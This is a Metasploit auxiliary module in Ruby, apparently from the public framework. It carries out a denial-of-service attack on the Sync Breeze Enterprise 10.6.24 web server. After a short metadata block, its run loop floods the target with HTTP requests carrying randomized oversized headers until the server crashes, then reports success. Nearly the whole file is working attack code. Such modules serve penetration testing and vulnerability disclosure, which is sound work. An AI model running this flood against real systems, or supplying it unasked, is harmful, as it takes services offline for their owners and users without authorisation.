##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Sync Breeze Enterprise 10.6.24 Denial Of Service',
      'Description'    => %q{
        This module triggers a Denial of Service vulnerability in the Sync Breeze Enterprise HTTP server.
        Vulnerability caused by a user mode write access memory violation and can be triggered with rapidly sending variety of HTTP requests with long HTTP header values.
        Sync Breeze Enterprise 10.6.24 version reportedly vulnerable.
      },
      'Author' 		=> [ 'Ege Balci <ege.balci@invictuseurope.com>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'https://github.com/EgeBalci/Sync_Breeze_Enterprise_10_6_24_-DOS' ],
        ],
      'DisclosureDate' => 'Mar 09 2018'))

    register_options(
      [
        Opt::RPORT(80),
      ])

  end

  def run
    
    print_status("Sending HTTP DoS packets...")
    trig = true

    begin
      connect
      disconnect
    rescue 
      print_error("Unable to connect to #{rhost}:#{rport}")
       trig = false
    end

    while trig do
        payload = ""
        rnd = rand(4)
        if rnd == 0 then
            payload << "PUT /index.html HTTP/1.1\n"
            payload << "Host: localhost\n"
            payload << "User-Agent: Mozilla\n"
            payload << "Accept: */*"+("A"*rand(8000))+"\r\n\r\n"
        elsif rnd == 1 then
            payload << "POST /"+("A"*rand(8000))+" HTTP/0.9\n"
            payload << "Host: localhost\n"
            payload << "User-Agent: Mozilla\n"
            payload << "Accept: */*\r\n\r\n"
        elsif rnd == 2 then
            payload << "POST /index.html HTTP/0.9\n"
            payload << "Host: localhost\n"
            payload << "User-Agent: Mozilla"+("A"*rand(8000))+"\n"
            payload << "Accept: */*\r\n\r\n"
        elsif rnd == 3 then
            payload << "GET /index.html HTTP/0.9\n"
            payload << "Host: localhost\n"
            payload << "User-Agent: Mozilla\n"
            payload << "Accept: */*"+("A"*rand(8000))+"\r\n\r\n"
        end

        print_status("Request size: (#{payload.size}) byte")
        begin
            connect
            sock.put(payload)
            disconnect
        rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            print_error("Unable to connect to #{rhost}:#{rport}")
            break
        rescue ::Errno::ECONNRESET,::Rex::ConnectionRefused
            print_good("DoS successful #{rhost} is down !")
            break
        end
    end

  end
end
